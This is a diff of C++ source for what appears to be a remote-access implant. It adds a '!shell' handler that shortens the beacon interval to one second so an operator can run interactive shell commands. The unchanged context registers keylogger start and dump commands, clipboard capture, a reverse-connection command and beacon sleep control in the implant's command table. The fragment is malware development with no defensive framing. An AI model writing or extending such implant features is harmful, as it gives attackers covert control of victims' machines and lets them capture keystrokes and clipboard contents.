@@ -806,6 +806,15 @@ static std::wstring HandleSleepCmd(const std::string& args) {
     return L"[+] Beacon interval set to " + std::to_wstring(secs) + L"s";
 }
 
+static std::wstring HandleShellMode(const std::string& args) {
+    if (args == "off" || args == "0") {
+        g_BeaconOverride = 0;
+        return L"[+] Shell mode off — beacon back to default interval";
+    }
+    g_BeaconOverride = 1; // 1s rapid-poll for interactive shell
+    return L"[+] Shell mode on — beacon at 1s, type commands freely; !shell off to reset";
+}
+
 static std::wstring HandleKeylogStart(const std::string& /*args*/) {
     if (KeylogRunning()) return L"[keylog: already running]";
     KeylogStart();
@@ -948,6 +957,8 @@ static const CmdEntry kCmdTable[] = {
     { "keylog_start",  true,  HandleKeylogStart },
     { "keylog_dump",   true,  HandleKeylogDump },
     { "sleep ",        false, HandleSleepCmd },
+    { "!shell",        true,  HandleShellMode },
+    { "!shell ",       false, HandleShellMode },
     { "!clipboard",    true,  HandleClipboard },
     { "!clipboard ",   false, HandleClipboard },
     { "!reverse ",     false, HandleReverse },
